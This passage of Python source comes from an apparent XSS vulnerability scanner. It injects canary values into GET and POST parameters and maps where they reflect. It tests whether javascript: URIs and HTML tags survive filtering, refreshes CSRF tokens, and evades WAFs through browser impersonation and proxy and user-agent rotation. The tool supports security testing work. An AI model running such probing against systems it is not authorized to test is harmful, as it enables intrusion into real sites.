                        param_name=param_name,
                        original_value=original_value,
                        reflection_transform=_reflection_transform(_sink_html, canary),
                        discovery_style=probe_seed.style,
                        probe_mode=probe_plan.mode,
                        tested_chars=probe_plan.chars,
                        reflections=[
                            _clone_reflection_context(ctx, surviving_chars=_surviving)
                            for ctx in _sink_refs
                        ],
                    )
            except Exception as _exc:
                log.debug("probe_url: sink_url check failed for %s: %s", sink_url, _exc)

        # Crawled-page sweep for GET-based stored XSS.
        # After the GET request the canary may be stored server-side; check
        # each crawled page (session cookies carry the storage context).
        # Priority: explicit sink_url already checked above; this sweeps the
        # crawl boundary for anything the user hasn't manually specified.
        if crawled_pages:
            _sweep_pages = [p for p in crawled_pages if p != sink_url][:30]
            for _fu in _sweep_pages:
                try:
                    _wait()
                    _fu_resp = _session_get(session, _fu, {"headers": {"User-Agent": next(ua_cycle)}})
                    _fu_html = _resp_html(_fu_resp)
                    _fu_refs = _find_reflections(_fu_html, canary)
                    if _fu_refs:
                        _char_url = _rebuild_url(url, {**all_params, param_name: probe_seed.char_probe_value})
                        _wait()
                        _session_get(session, _char_url, {"headers": {"User-Agent": next(ua_cycle)}})
                        _wait()
                        _fu_resp2 = _session_get(session, _fu, {"headers": {"User-Agent": next(ua_cycle)}})
                        _surviving = _analyze_char_survival(_resp_html(_fu_resp2), canary)
                        if _reflection_transform(_fu_html, canary) == "upper":
                            _surviving = _surviving.union(frozenset("ABCDEFGHIJKLMNOPQRSTUVWXYZ"))
                        log.debug(
                            "probe_url: stored canary found in crawled page %s for param %s",
                            _fu, param_name,
                        )
                        return ProbeResult(
                            param_name=param_name,
                            original_value=original_value,
                            reflection_transform=_reflection_transform(_fu_html, canary),
                            discovery_style="stored_get",
                            probe_mode=probe_plan.mode,
                            tested_chars=probe_plan.chars,
                            reflections=[
                                _clone_reflection_context(ctx, surviving_chars=_surviving)
                                for ctx in _fu_refs
                            ],
                        )
                except Exception as _exc:
                    log.debug("probe_url: crawled-page sweep error for %s: %s", _fu, _exc)

        return ProbeResult(
            param_name=param_name,
            original_value=original_value,
            reflection_transform=reflection_transform,
            discovery_style=probe_seed.style,
            probe_mode=probe_plan.mode,
            tested_chars=probe_plan.chars,
        )

    # Phase 2 — character survival
    _wait()
    try:
        resp2 = _session_get(
            session,
            _rebuild_url(
                url,
                {**all_params, param_name: probe_seed.reflection_value + probe_marker},
            ),
            req_kwargs,
        )
        surviving = _analyze_char_survival(_resp_html(resp2), canary)
        if reflection_transform == "upper":
            surviving = surviving.union(frozenset("ABCDEFGHIJKLMNOPQRSTUVWXYZ"))
    except Exception:
        surviving = frozenset()

    final_reflections = [
        _clone_reflection_context(ctx, surviving_chars=surviving)
        for ctx in reflections
    ]

    # ── href/formaction follow-up ─────────────────────────────────────────────
    # When we have an html_body reflection but < is blocked (so is_injectable
    # would be False), check whether a javascript: URI survives in href/formaction.
    # This turns a "soft dead" into an injectable html_attr_url context.
    has_html_body = any(ctx.context_type == "html_body" for ctx in final_reflections)
    already_injectable = any(ctx.is_exploitable for ctx in final_reflections)
    if has_html_body and not already_injectable:
        try:
            rate_val = 1.0 / delay if delay > 0 else 25.0
            _confirmed_attr = _probe_href_injectable(
                url=url,
                param_name=param_name,
                original_value=original_value,
                canary=canary,
                rate=rate_val,
                auth_headers=auth_headers,
            )
            if _confirmed_attr:
                final_reflections.append(
                    ReflectionContext(
                        context_type="html_attr_url",
                        attr_name=_confirmed_attr,
                        surviving_chars=frozenset("<>\"'"),
                        snippet=f"{_confirmed_attr}=javascript: URI injection confirmed",
                        evidence_confidence=0.92,
                    )
                )
                log.info(
                    "_probe_param: html_attr_url (%s=javascript:) confirmed for param %s at %s",
                    _confirmed_attr, param_name, url,
                )
        except Exception as _href_exc:
            log.debug("_probe_param: href follow-up failed for %s: %s", param_name, _href_exc)

    # ── HTML tag survival follow-up ───────────────────────────────────────────
    # Raw `<` may be encoded in text context (e.g. sanitizer encodes &lt;) but
    # whole HTML tags like <img src=x> can still pass through the filter.
    # This is different from raw char survival — test a full tag structure.
    # If <img src=x> survives, the AI can attempt filter-bypass payloads
    # (event handler obfuscation, alternative tags, mXSS, etc.).
    already_injectable2 = any(ctx.is_exploitable for ctx in final_reflections)
    if has_html_body and not already_injectable2:
        try:
            _tag_test_payload = f"<img src={canary}>"
            _tag_test_url = _rebuild_url(url, {**all_params, param_name: _tag_test_payload})
            _wait()
            _tag_resp = _session_get(session, _tag_test_url, req_kwargs)
            _tag_html = _resp_html(_tag_resp)
            # Check if <img was preserved (tag injection possible even if raw < isn't)
            if "<img" in _tag_html.lower() and canary.lower() in _tag_html.lower():
                final_reflections.append(
                    ReflectionContext(
                        context_type="html_body",
                        surviving_chars=frozenset("<>\"'"),
                        snippet=f"HTML tag injection confirmed (<img> passes filter)",
                        evidence_confidence=0.88,
                    )
                )
                log.info(
                    "_probe_param: html_tag_injectable confirmed for param %s at %s "
                    "(raw < encoded but <img> passes filter)",
                    param_name, url,
                )
        except Exception as _tag_exc:
            log.debug("_probe_param: html tag follow-up failed for %s: %s", param_name, _tag_exc)

    return ProbeResult(
        param_name=param_name,
        original_value=original_value,
        reflection_transform=reflection_transform,
        discovery_style=probe_seed.style,
        probe_mode=probe_plan.mode,
        tested_chars=probe_plan.chars,
        reflections=final_reflections,
    )


def _probe_param_playwright(
    page: Any,
    url: str,
    param_name: str,
    original_value: str,
    all_params: dict[str, str],
    *,
    canary: str,
    delay: float,
    ua_cycle: Any,
    proxy_cycle: Any | None,
    waf: str | None = None,
    auth_headers: dict[str, str] | None = None,
) -> ProbeResult:
    """Probe a single parameter using a shared Playwright page.

    Used when WAF detection indicates a real browser is required. The caller
    owns the Playwright browser context so session cookies and auth state are
    preserved across every probe request.
    """

    probe_seed = _probe_seed_for_param(param_name, canary, original_value)
    probe_plan = _adaptive_probe_plan(
        url=url,
        waf=waf,
        auth_headers=auth_headers,
        param_name=param_name,
        param_count=len(all_params),
    )
    probe_marker = _PROBE_OPEN + probe_plan.chars + _PROBE_CLOSE
    # Phase 1 — reflection mapping
    if delay > 0:
        time.sleep(delay)
    try:
        resp1_html = _page_fetch_html(
            page,
            _rebuild_url(url, {**all_params, param_name: probe_seed.reflection_value}),
        )
    except Exception as exc:
        return ProbeResult(
            param_name=param_name,
            original_value=original_value,
            error=str(exc),
            discovery_style=probe_seed.style,
            probe_mode=probe_plan.mode,
            tested_chars=probe_plan.chars,
        )

    html1 = resp1_html
    reflections = _find_reflections(html1, canary)
    reflection_transform = _reflection_transform(html1, canary)
    if not reflections:
        return ProbeResult(
            param_name=param_name,
            original_value=original_value,
            reflection_transform=reflection_transform,
            discovery_style=probe_seed.style,
            probe_mode=probe_plan.mode,
            tested_chars=probe_plan.chars,
        )

    # Phase 2 — character survival
    if delay > 0:
        time.sleep(delay)
    try:
        resp2_html = _page_fetch_html(
            page,
            _rebuild_url(
                url,
                {**all_params, param_name: probe_seed.reflection_value + probe_marker},
            ),
        )
        surviving = _analyze_char_survival(resp2_html, canary)
        if reflection_transform == "upper":
            surviving = surviving.union(frozenset("ABCDEFGHIJKLMNOPQRSTUVWXYZ"))
    except Exception:
        surviving = frozenset()

    return ProbeResult(
        param_name=param_name,
        original_value=original_value,
        reflection_transform=reflection_transform,
        discovery_style=probe_seed.style,
        probe_mode=probe_plan.mode,
        tested_chars=probe_plan.chars,
        reflections=[
            _clone_reflection_context(ctx, surviving_chars=surviving)
            for ctx in reflections
        ],
    )


def probe_url(
    url: str,
    *,
    rate: float = 25.0,
    waf: str | None = None,
    on_result: Callable[[ProbeResult], None] | None = None,
    auth_headers: dict[str, str] | None = None,
    sink_url: str | None = None,
    crawled_pages: list[str] | None = None,
) -> list[ProbeResult]:
    """Probe all query parameters of *url* for XSS reflection contexts.

    Sends two requests per parameter:
    1. Canary reflection probe → maps where input lands in the response.
    2. Character survival probe → determines which XSS chars survive filters.

    Tracking/analytics parameters (utm_*, gclid, fbclid, ranMID, etc.) are
    silently skipped — they are never reflected in meaningful page content.

    When *waf* indicates a browser-required WAF (akamai, cloudflare, etc.),
    a single Playwright browser session handles all probe requests instead of
    curl_cffi so TLS fingerprint and JS challenges are handled correctly.

    Args:
        url:          Target URL with query parameters to test.
        rate:         Max requests per second (0 = uncapped). Shared with ``--rate``.
        waf:          Detected WAF name. Controls which fetch strategy is used.
        on_result:    Callback fired after each parameter finishes probing.
        auth_headers: Extra headers (e.g. Authorization, Cookie) merged into
                      every probe request for authenticated scanning.
    """
    import urllib.parse

    parsed = urllib.parse.urlparse(url)
    raw_params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
    if not raw_params:
        return []

    flat_params_all = {k: v[0] for k, v in raw_params.items()}

    # Drop known tracking/analytics params — they are never XSS-injectable
    blocked = {k for k in flat_params_all if k.lower() in _TRACKING_PARAM_BLOCKLIST}
    flat_params = {k: v for k, v in flat_params_all.items() if k not in blocked}
    if blocked:
        log.info(
            "Skipping %d tracking/analytics param(s): %s",
            len(blocked), ", ".join(sorted(blocked)),
        )
    if not flat_params:
        log.debug("All params filtered by tracking blocklist — nothing to probe.")
        return []

    delay = (1.0 / rate) if rate > 0 else 0
    canary = _make_canary()

    ua_list = _load_rotation_values(os.environ.get("AXSS_USER_AGENTS")) or [
        "axss/0.1 (+authorized security testing; scrapling)"
    ]
    proxies_list = _load_rotation_values(os.environ.get("AXSS_PROXIES")) or []
    ua_cycle = cycle(ua_list)
    proxy_cycle = cycle(proxies_list) if proxies_list else None

    results: list[ProbeResult] = []
    needs_browser = waf is not None and waf.lower() in _BROWSER_REQUIRED_WAFS

    if needs_browser:
        log.info("WAF=%s — using Playwright for probe requests", waf)
        from playwright.sync_api import sync_playwright

        proxy = next(proxy_cycle) if proxy_cycle else None
        user_agent = next(ua_cycle)
        extra_headers, cookies, browser_user_agent = _browser_context_auth(
            url,
            auth_headers,
            user_agent,
        )
        launch_kwargs: dict[str, Any] = {
            "headless": True,
            "args": ["--no-sandbox", "--disable-dev-shm-usage", "--disable-gpu"],
        }
        if proxy:
            launch_kwargs["proxy"] = {"server": proxy}

        with sync_playwright() as pw:
            browser = pw.chromium.launch(**launch_kwargs)
            context = browser.new_context(
                ignore_https_errors=True,
                extra_http_headers={**extra_headers, "Accept": "text/html,application/xhtml+xml"},
                user_agent=browser_user_agent,
            )
            try:
                if cookies:
                    context.add_cookies(cookies)

                def _route_handler(route: Any) -> None:
                    if route.request.resource_type in {"image", "media", "font", "stylesheet"}:
                        route.abort()
                    else:
                        route.continue_()

                context.route("**/*", _route_handler)
                page = context.new_page()

                for param_name, original_value in flat_params.items():
                    probe_seed = _probe_seed_for_param(param_name, canary, original_value)
                    probe_plan = _adaptive_probe_plan(
                        url=url,
                        waf=waf,
                        auth_headers=auth_headers,
                        param_name=param_name,
                        param_count=len(flat_params),
                    )
                    result = _probe_param_playwright(
                        page, url, param_name, original_value, flat_params,
                        canary=canary, delay=delay, ua_cycle=ua_cycle, proxy_cycle=proxy_cycle,
                        waf=waf,
                        auth_headers=auth_headers,
                    )
                    if sink_url and not result.reflections and not result.error:
                        try:
                            if delay > 0:
                                time.sleep(delay)
                            _sink_html = _page_fetch_html(page, sink_url)
                            _sink_refs = _find_reflections(_sink_html, canary)
                            if _sink_refs:
                                _char_url = _rebuild_url(
                                    url,
                                    {
                                        **flat_params,
                                        param_name: (
                                            probe_seed.reflection_value
                                            + _PROBE_OPEN
                                            + probe_plan.chars
                                            + _PROBE_CLOSE
                                        ),
                                    },
                                )
                                if delay > 0:
                                    time.sleep(delay)
                                _page_fetch_html(page, _char_url)
                                if delay > 0:
                                    time.sleep(delay)
                                _sink_html2 = _page_fetch_html(page, sink_url)
                                _surviving = _analyze_char_survival(_sink_html2, canary)
                                if _reflection_transform(_sink_html, canary) == "upper":
                                    _surviving = _surviving.union(frozenset("ABCDEFGHIJKLMNOPQRSTUVWXYZ"))
                                result = ProbeResult(
                                    param_name=param_name,
                                    original_value=original_value,
                                    reflection_transform=_reflection_transform(_sink_html, canary),
                                    discovery_style=probe_seed.style,
                                    probe_mode=probe_plan.mode,
                                    tested_chars=probe_plan.chars,
                                    reflections=[
                                        _clone_reflection_context(ctx, surviving_chars=_surviving)
                                        for ctx in _sink_refs
                                    ],
                                )
                                log.debug(
                                    "probe_url (browser): canary found in sink_url %s for param %s",
                                    sink_url, param_name,
                                )
                        except Exception as _exc:
                            log.debug("probe_url (browser): sink_url check failed: %s", _exc)
                    results.append(result)
                    if on_result:
                        on_result(result)
            finally:
                context.close()
                browser.close()
    else:
        # Parallel probe: each thread gets its own FetcherSession; the shared
        # token-bucket rate limiter ensures the global req/s cap is respected.
        rl = _RateLimiter(rate)
        _cycle_lock = threading.Lock()

        def _next_ua_proxy() -> tuple[str, str | None]:
            with _cycle_lock:
                return next(ua_cycle), (next(proxy_cycle) if proxy_cycle else None)

        def _probe_one(param_name: str, original_value: str) -> ProbeResult:
            ua, proxy = _next_ua_proxy()
            with FetcherSession(
                impersonate="chrome",
                stealthy_headers=True,
                timeout=20,
                follow_redirects=True,
                retries=1,
            ) as _session:
                return _probe_param(
                    _session, url, param_name, original_value, flat_params,
                    canary=canary, delay=0,
                    ua_cycle=cycle([ua]),
                    proxy_cycle=cycle([proxy]) if proxy else None,
                    waf=waf,
                    auth_headers=auth_headers,
                    rate_limiter=rl,
                    sink_url=sink_url,
                    crawled_pages=crawled_pages,
                )

        n_workers = min(len(flat_params), _PROBE_MAX_WORKERS)
        with ThreadPoolExecutor(max_workers=n_workers) as pool:
            future_map = {
                pool.submit(_probe_one, pn, ov): (pn, ov)
                for pn, ov in flat_params.items()
            }
            for fut in as_completed(future_map):
                pn, ov = future_map[fut]
                try:
                    result = fut.result()
                except Exception as exc:
                    result = ProbeResult(param_name=pn, original_value=ov, error=str(exc))
                results.append(result)
                if on_result:
                    on_result(result)

    return results


# ---------------------------------------------------------------------------
# POST form probing
# ---------------------------------------------------------------------------

def _extract_field_value(html: str, field_name: str) -> str | None:
    """Extract the current value of a named input field from an HTML page.

    Handles both attribute orderings:
      <input name="X" value="TOKEN"> and <input value="TOKEN" name="X">
    """
    esc = re.escape(field_name)
    # name before value
    m = re.search(
        rf'''name\s*=\s*["']{esc}["'][^>]*?value\s*=\s*["']([^"']*)["']''',
        html, re.IGNORECASE,
    )
    if m:
        return m.group(1)
    # value before name
    m = re.search(
        rf'''value\s*=\s*["']([^"']*)["'][^>]*?name\s*=\s*["']{esc}["']''',
        html, re.IGNORECASE,
    )
    if m:
        return m.group(1)
    return None


def probe_post_form(
    action_url: str,
    source_page_url: str,
    param_names: list[str],
    csrf_field: str | None,
    hidden_defaults: dict[str, str],
    *,
    rate: float = 25.0,
    waf: str | None = None,
    on_result: Callable[[ProbeResult], None] | None = None,
    auth_headers: dict[str, str] | None = None,
    crawled_pages: list[str] | None = None,
    sink_url: str | None = None,
) -> list[ProbeResult]:
    """Probe POST form parameters for XSS reflection.

    For each parameter in *param_names*:
      1. GETs *source_page_url* to fetch a fresh CSRF token value.
      2. POSTs *action_url* with the canary in the target param + real CSRF token.
      3. Classifies any reflections in the response.
      4. If not found in the POST response, sweeps source_page_url, origin root,
         and all *crawled_pages* for the canary (catches session-stored XSS).
      5. POSTs a second time with the char probe; reads survival from the same
         page that contained the reflection.

    When *waf* requires a real browser (akamai, cloudflare, etc.), the function
    falls back to using requests for the POST since DynamicSession is GET-only.
    Playwright-based POST probing happens later in the active scan executor.

    Args:
        action_url:      Absolute URL to POST the form to.
        source_page_url: Page that renders the form (GET to obtain fresh CSRF token).
        param_names:     Injectable parameter names (CSRF field already excluded).
        csrf_field:      Name of the CSRF token field, or None.
        hidden_defaults: Fallback hidden field values from crawl time.
        rate:            Max requests per second.
        waf:             Detected WAF name.
        on_result:       Optional callback fired after each param is probed.
        auth_headers:    Extra headers (e.g. Authorization, Cookie).
        crawled_pages:   All pages visited during the crawl — swept for stored XSS.
    """
    delay = (1.0 / rate) if rate > 0 else 0
    canary = _make_canary()

    ua_list = _load_rotation_values(os.environ.get("AXSS_USER_AGENTS")) or [
        "axss/0.1 (+authorized security testing; scrapling)"
    ]
    ua_cycle = cycle(ua_list)

    results: list[ProbeResult] = []

    # We always use FetcherSession for the source-page GET and the POST itself.
    # WAF-requiring sites that need a browser for the POST will be handled by
    # the Playwright-based fire_post() in the active scan executor.
    with FetcherSession(
        impersonate="chrome",
        stealthy_headers=True,
        timeout=20,
        follow_redirects=True,
        retries=1,
    ) as session:
        for param_name in param_names:
            probe_seed = _probe_seed_for_param(param_name, canary, "")
            probe_plan = _adaptive_probe_plan(
                url=action_url,
                waf=waf,
                auth_headers=auth_headers,
                param_name=param_name,
                param_count=len(param_names),
            )
            merged_headers: dict[str, str] = {
                **(auth_headers or {}),
                "User-Agent": next(ua_cycle),
            }
            req_kwargs: dict[str, Any] = {"headers": merged_headers}

            # --- Step 1: GET source page to extract fresh CSRF token ---
            csrf_value: str | None = None
            if csrf_field:
                if delay > 0:
                    time.sleep(delay)
                try:
                    source_resp = _session_get(session, source_page_url, req_kwargs)
                    source_html = _resp_html(source_resp)
                    csrf_value = _extract_field_value(source_html, csrf_field)
                    if csrf_value is None:
                        # Fall back to value from crawl time
                        csrf_value = hidden_defaults.get(csrf_field)
                except Exception as exc:
                    log.debug(
                        "POST probe: failed to fetch source page %s: %s",
                        source_page_url, exc,
                    )
                    csrf_value = hidden_defaults.get(csrf_field)

            def _build_post_body(inject_value: str) -> dict[str, str]:
                """Build the POST body with *inject_value* in *param_name*."""
                body: dict[str, str] = {}
                # Include all other non-target params with placeholder values
                for other in param_names:
                    if other != param_name:
                        body[other] = "test"
                # Include hidden defaults for other hidden fields
                for hname, hval in hidden_defaults.items():
                    if hname != param_name and hname not in body:
                        body[hname] = hval
                # CSRF token with freshly fetched value
                if csrf_field and csrf_value is not None:
                    body[csrf_field] = csrf_value
                body[param_name] = inject_value
                return body

            # --- Step 2: Reflection probe ---
            if delay > 0:
                time.sleep(delay)
            try:
                resp1 = session.post(
                    action_url,
                    data=_build_post_body(probe_seed.reflection_value),
                    **req_kwargs,
                )
                html1 = _resp_html(resp1)
            except Exception as exc:
                result = ProbeResult(
                    param_name=param_name,
                    original_value="",
                    error=str(exc),
                    discovery_style=probe_seed.style,
                    probe_mode=probe_plan.mode,
                    tested_chars=probe_plan.chars,
                )
                results.append(result)
                if on_result:
                    on_result(result)
                continue

            reflections = _find_reflections(html1, canary)
            reflection_transform = _reflection_transform(html1, canary)

            # --- Follow-up page check for session-stored XSS ---
            # If the POST response itself doesn't reflect the canary, the input
            # may be stored server-side and reflected on a subsequent page load
            # (e.g. "Hello {name}" on the index page after a "Name saved" POST).
            # Check source_page_url and the origin root as common reflection sites.
            follow_up_url: str | None = None
            if not reflections:
                import urllib.parse as _up
                _pp = _up.urlparse(source_page_url)
                _origin_root = f"{_pp.scheme}://{_pp.netloc}/"
                # Priority order: source page → origin root → every crawled page.
                # dict.fromkeys preserves order and deduplicates.
                # sink_url (manually specified) is checked first — highest priority
                _follow_up_candidates = list(dict.fromkeys(
                    ([sink_url] if sink_url else [])
                    + [source_page_url, _origin_root]
                    + list(crawled_pages or [])[:probe_plan.follow_up_limit]
                ))
                for _fu in _follow_up_candidates:
                    try:
                        if delay > 0:
                            time.sleep(delay)
                        _fu_resp = _session_get(session, _fu, req_kwargs)
                        _fu_html = _resp_html(_fu_resp)
                        _fu_refs = _find_reflections(_fu_html, canary)
                        if _fu_refs:
                            reflections = _fu_refs
                            follow_up_url = _fu
                            reflection_transform = _reflection_transform(_fu_html, canary)
                            log.debug(
                                "POST probe: canary found on follow-up page %s (session-stored)",
                                _fu,
                            )
                            break
                    except Exception:
                        pass

            if not reflections:
                result = ProbeResult(param_name=param_name, original_value="")
                result.discovery_style = probe_seed.style
                result.reflection_transform = reflection_transform
                result.probe_mode = probe_plan.mode
                result.tested_chars = probe_plan.chars
                results.append(result)
                if on_result:
                    on_result(result)
                continue

            # --- Step 3: Char survival probe ---
            if delay > 0:
                time.sleep(delay)
            surviving = frozenset()
            try:
                # Refresh CSRF token for the second POST if needed
                current_csrf = csrf_value
                if csrf_field:
                    try:
                        src2 = _session_get(session, source_page_url, req_kwargs)
                        fresh = _extract_field_value(_resp_html(src2), csrf_field)
                        if fresh is not None:
                            current_csrf = fresh
                    except Exception:
                        pass

                # Build body with fresh CSRF and char probe value
                char_body: dict[str, str] = {}
                for other in param_names:
                    if other != param_name:
                        char_body[other] = "test"
                for hname, hval in hidden_defaults.items():
                    if hname != param_name and hname not in char_body:
                        char_body[hname] = hval
                if csrf_field and current_csrf is not None:
                    char_body[csrf_field] = current_csrf
                char_body[param_name] = (
                    probe_seed.reflection_value + _PROBE_OPEN + probe_plan.chars + _PROBE_CLOSE
                )

                resp2 = session.post(action_url, data=char_body, **req_kwargs)

                if follow_up_url:
                    # Char survival is on the follow-up page, not the POST response.
                    if delay > 0:
                        time.sleep(delay)
                    try:
                        _fu_resp2 = _session_get(session, follow_up_url, req_kwargs)
                        surviving = _analyze_char_survival(_resp_html(_fu_resp2), canary)
                    except Exception:
                        pass
                else:
                    surviving = _analyze_char_survival(_resp_html(resp2), canary)
            except Exception:
                pass

            result = ProbeResult(
                param_name=param_name,
                original_value="",
                reflection_transform=reflection_transform,
                discovery_style=probe_seed.style,
                probe_mode=probe_plan.mode,
                tested_chars=probe_plan.chars,
                reflections=[
                    _clone_reflection_context(ctx, surviving_chars=surviving)
                    for ctx in reflections
                ],
            )
            results.append(result)
            if on_result:
                on_result(result)

    return results


def _probe_href_injectable(
    url: str,
    param_name: str,
    original_value: str,
    canary: str,
    rate: float,
    auth_headers: dict[str, str] | None,
) -> str | None:
    """Follow-up probe: check whether a javascript: URI survives into href/formaction.

    Injects ``<a href="javascript:{canary}">x</a>`` and
    ``<button formaction="javascript:{canary}">x</button>`` as the param value
    and checks the HTTP response for literal href/formaction URI reflection.

    Returns the attribute name ("href" or "formaction") if confirmed, else None.
    """
    parsed = urllib.parse.urlparse(url)
    raw_params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
    flat_params = {k: v[0] for k, v in raw_params.items()}

    ua_list = _load_rotation_values(os.environ.get("AXSS_USER_AGENTS")) or [
        "axss/0.1 (+authorized security testing; scrapling)"
    ]
    merged_headers: dict[str, str] = {**(auth_headers or {}), "User-Agent": ua_list[0]}
    req_kwargs: dict[str, Any] = {"headers": merged_headers}

    delay = max(0.0, 1.0 / rate) if rate > 0 else 0.0

    def _wait() -> None:
        if delay > 0:
            time.sleep(delay)

    probes = [
        ("href", f'<a href="javascript:{canary}">x</a>'),
        ("formaction", f'<button formaction="javascript:{canary}">x</button>'),
    ]

    try:
        with FetcherSession(impersonate="chrome", stealthy_headers=True, timeout=20,
                            follow_redirects=True, retries=1) as session:
            for attr_name, inject_value in probes:
                _wait()
                try:
                    test_url = _rebuild_url(url, {**flat_params, param_name: inject_value})
                    resp = _session_get(session, test_url, req_kwargs)
                    html = _resp_html(resp)
                    # Case-insensitive check for the attribute name, case-sensitive for canary value
                    pattern = re.compile(
                        rf'(?i){re.escape(attr_name)}\s*=\s*["\']?javascript:{re.escape(canary)}',
                    )
                    if pattern.search(html):
                        log.debug(
                            "_probe_href_injectable: confirmed %s=javascript: for param %s at %s",
                            attr_name, param_name, url,
                        )
                        return attr_name
                except Exception as exc:
                    log.debug("_probe_href_injectable: request failed for %s: %s", attr_name, exc)
    except Exception as exc:
        log.debug("_probe_href_injectable: session setup failed: %s", exc)

    return None


def make_fast_probe_result(param_name: str, original_value: str) -> "ProbeResult":
    """Synthetic probe result for fast (no-probe) mode. Covers all contexts."""
    ctx = ReflectionContext(
        context_type="fast_omni",
        surviving_chars=frozenset("<>\"'`=;/()"),  # assume everything survives
        snippet="[fast mode — no probe]",
        evidence_confidence=0.5,
    )
    return ProbeResult(
        param_name=param_name,
        original_value=original_value,
        reflections=[ctx],
        probe_mode="fast_omni",
    )


# Optimistic surviving-chars set for T0 (normal mode): we don't test char
# survival — normal mode T1 bypasses char filtering anyway (_t1_surviving=None).
# We need *some* chars here so is_exploitable returns True for html_body etc.
_NORMAL_T0_ASSUMED_SURVIVING: frozenset[str] = frozenset('<>"\'`=;/()')


def probe_param_context(
    url: str,
    param_name: str,
    param_value: str,
    auth_headers: dict[str, str] | None = None,
    timeout: int = 10,
) -> "ProbeResult | None":
    """Lightweight T0 context detection for normal mode.

    Fires one scrapling HTTP GET with a short canary injected into *param_name*
    and classifies where the canary lands in the response HTML using the existing
    _classify_context_at() logic.  Returns a ProbeResult with a real context_type
    and optimistic surviving_chars, or None if the param is not reflected or the
    request fails.

    Costs: one HTTP request, no Playwright.
    Does NOT test surviving chars — that is deep mode's job.
    """
    canary = "axsst0" + secrets.token_hex(4)

    parsed = urllib.parse.urlparse(url)
    params = dict(urllib.parse.parse_qsl(parsed.query))
    params[param_name] = canary
    probe_url_str = urllib.parse.urlunparse(parsed._replace(query=urllib.parse.urlencode(params)))

    try:
        with FetcherSession(
            impersonate="chrome",
            stealthy_headers=True,
            timeout=timeout,
            follow_redirects=True,
            retries=1,
        ) as session:
            resp = session.get(
                probe_url_str,
                headers={**(auth_headers or {}), "User-Agent": "Mozilla/5.0"},
            )
            html: str = ""
            _text = getattr(resp, "text", None)
            if _text:
                html = str(_text)
            elif hasattr(resp, "body") and resp.body:
                html = resp.body.decode("utf-8", errors="replace")
    except Exception as e:
        log.debug("probe_param_context failed for %s param=%s: %s", url, param_name, e)
        return None

    idx = html.find(canary)
    if idx == -1:
        return None

    ctx = _classify_context_at(html, idx, canary)
    if ctx is None:
        # Inert context (textarea, style, title) — not exploitable
        return None

    # Attach optimistic surviving_chars so is_injectable returns True.
    # Normal mode T1 ignores these chars for filtering anyway.
    ctx_with_chars = _clone_reflection_context(
        ctx, surviving_chars=_NORMAL_T0_ASSUMED_SURVIVING
    )

    return ProbeResult(
        param_name=param_name,
        original_value=param_value,
        reflections=[ctx_with_chars],
        probe_mode="normal_t0",
    )


def enrich_context(context: ParsedContext, probe_results: list[ProbeResult]) -> ParsedContext:
    """Merge active probe results into *context*, prepending confirmed sinks and notes."""
    from dataclasses import replace as dc_replace

    extra_sinks: list[DomSink] = []
    extra_notes: list[str] = []

    for result in probe_results:
        if result.error:
            extra_notes.append(
                f"[probe] '{result.param_name}': request error — {result.error}"
            )
            continue
        if not result.is_reflected:
            extra_notes.append(f"[probe] '{result.param_name}': not reflected.")
            continue

        extra_sinks.extend(result.to_sinks())
        for ctx in result.reflections:
            chars_str = "".join(sorted(ctx.surviving_chars)) if ctx.surviving_chars else "?"
            status = "INJECTABLE" if ctx.is_exploitable else "chars filtered"
            tested_chars = getattr(result, "tested_chars", PROBE_CHARS) or PROBE_CHARS
            probe_mode = getattr(result, "probe_mode", "") or "standard"
            extra_notes.append(
                f"[probe:CONFIRMED] '{result.param_name}' → {ctx.short_label} "
                f"surviving={chars_str!r} tested={tested_chars!r} mode={probe_mode} [{status}]"
            )
            subcontext_payload = {
                "param_name": result.param_name,
                "context_type": ctx.context_type,
                "attr_name": ctx.attr_name,
                "tag_name": ctx.tag_name,
                "quote_style": ctx.quote_style,
                "html_subcontext": ctx.html_subcontext,
                "payload_shape": ctx.payload_shape,
                "attacker_prefix": ctx.attacker_prefix,
                "attacker_suffix": ctx.attacker_suffix,
                "snippet": _truncate_context_fragment(ctx.snippet, limit=180, tail=False),
                "explanation": ctx.subcontext_explanation,
                "confidence": round(ctx.evidence_confidence, 2) if ctx.evidence_confidence else 0.0,
                "surviving_chars": sorted(ctx.surviving_chars),
                "is_injectable": ctx.is_exploitable,
            }
            extra_notes.append("[probe:SUBCONTEXT] " + json.dumps(subcontext_payload, ensure_ascii=True))

    return dc_replace(
        context,
        dom_sinks=extra_sinks + context.dom_sinks,
        notes=extra_notes + context.notes,
    )
